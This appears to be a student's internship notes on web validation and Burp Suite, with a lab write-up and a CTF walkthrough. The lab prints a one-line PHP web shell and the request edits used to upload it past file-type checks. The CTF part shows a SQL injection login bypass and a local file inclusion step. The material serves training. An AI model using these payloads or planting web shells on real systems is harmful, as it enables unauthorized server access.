# 🧠 Day 2: Client-Side vs Server-Side Validation, Burp Suite, and CTF Walkthrough

## 📚 Topics Covered

### ✅ Client-Side vs Server-Side Validation

| **Aspect**           | **Client-Side Validation**                 | **Server-Side Validation**                     |
| -------------------- | ------------------------------------------ | ---------------------------------------------- |
| Performed On         | User’s browser                             | Web server                                     |
| Speed                | Faster (no server round trip)              | Slower (requires server communication)         |
| Security             | Less secure (can be bypassed by attackers) | More secure (cannot be easily bypassed)        |
| Example Technologies | JavaScript, HTML5 input types              | PHP, Python, Node.js, etc.                     |
| Purpose              | Improve UX, reduce server load             | Ensure data integrity and application security |

🔒 **Conclusion:** Always implement both types of validation. Never rely solely on client-side checks.

---

## 🛠️ Burp Suite Overview

**Burp Suite** is a powerful web vulnerability scanner and proxy tool used by ethical hackers and pentesters to:

- Intercept HTTP/HTTPS traffic between browser and server.
- Modify requests before they reach the server.
- Analyze headers, cookies, and form data.
- Perform automated scans and manual testing.

> 💡 **Definition:** Burp Suite acts as a **man-in-the-middle** proxy that captures and modifies HTTP requests/responses between your browser (frontend) and the server (backend).

### ⚔️ 3 Lines of Defense in Web Applications

1. **Source Code Formatting** – Modifying elements directly via browser dev tools.
2. **Header Analysis** – Viewing and editing request headers.
3. **Burp Suite Interception** – Full control of data flow using proxy.

If none of the above allow you to bypass validation, it is likely **server-side validated**.

> 🧠 **Note:** `.htaccess` or `.hea` files are often used to enforce server-side rules.

---

## 🔬 Lab: Upload PHP Web Shell Using Burp Suitre

### 🎯 Objective:

Exploit a vulnerable file upload feature to gain shell access to the server.

### 🧪 Steps Followed:

1. **Prepare a PHP File** disguised as a `.png`, like `shell.php.png`, containing: ```<?php system($_GET['cmd']); ?>```
2. Inspect the page, **modify the file input** accept attribute if needed.
3. Switch Burp Intercept **ON**.
4. **Upload the file** → Burp intercepts the request.
5. In Burp, change:  
        ```filename="shell.php.png"```  
       ```Content-Type: image/png```   
   to:   
        ```filename="shell.php"```  
       ``` Content-Type: application/x-php```  
6. **Forward the request** → Server accepts it.
7. **Access the file** via URL (e.g., ```/uploads/shell.php```) and use ```?cmd=ls```.
![Burp suite malware attack](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/burp2.jpg](http://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/burpsuit.jpg)
![Burp suite malware attack](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/burp2.jpg)
### 🔍 Wappalyzer Extension
Wappalyzer is a browser extension used to identify backend and frontend tech stack such as:

- Languages (PHP, Python, Ruby)
-  Web servers (Apache, Nginx)
- Frameworks (Laravel, Django)
- CMS (WordPress, Joomla)

> 💡 **Note**:You can also analyze backend headers via Burp Repeater or server error messages.
---

### 🕹️ CTF Walkthrough
The CTF involved exploiting 3 vulnerabilities:

1️⃣ **SQL Injection (Authentication Bypass)**

    Used SQLi payload on login page:
    Username: admin'--
    Password: (blank)
    This bypasses login logic and logs you in as admin.

![SQL_ctf](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf4.jpg)

2️⃣ **Security Misconfiguration**

    Inspecting HTML revealed hardcoded credentials:
    <!-- Admin Username: administrator -->
    <!-- Admin Password: AdminPass2024 -->
    <!-- Admin URL: /admin -->  
    Used them to login into admin panel.

![SQL_ctf](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf3.jpg)
3️⃣ **LFI Attack (Local File Inclusion)**

    Input field in admin panel was vulnerable:
    ?q=flag.txt
    Retrieved flag from flag.txt

![SQL_ctf](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf1.jpg)
🏁 **Final Flag:**
```CTF{sql_injection_and_lfi_chain_complete}```

![SQL_ctf]([https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf1.jpg](https://github.com/ayanrfn/cybersecurity-internship-2025/blob/main/day2img/ctf2.jpg))


		




